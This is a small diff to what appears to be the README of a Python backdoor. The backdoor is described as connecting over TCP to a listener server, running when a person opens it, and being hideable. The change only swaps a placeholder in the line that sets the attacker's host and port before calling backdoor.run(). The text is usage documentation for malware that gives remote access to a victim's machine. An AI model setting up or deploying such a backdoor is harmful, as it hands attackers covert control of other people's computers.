@@ -22,7 +22,7 @@ Connects via TCP to listener server.  It runs once a person opens it; you can hi
 At the end of the code, set the ip and port where to establish the connection:
 ```python
 try: 
-    backdoor = Backdoor('<ip>', <port>) # CHANGE HOST AND PORT HERE!
+    backdoor = Backdoor('HOST', PORT) # CHANGE HOST AND PORT HERE!
     backdoor.run()
 except:
     sys.exit()
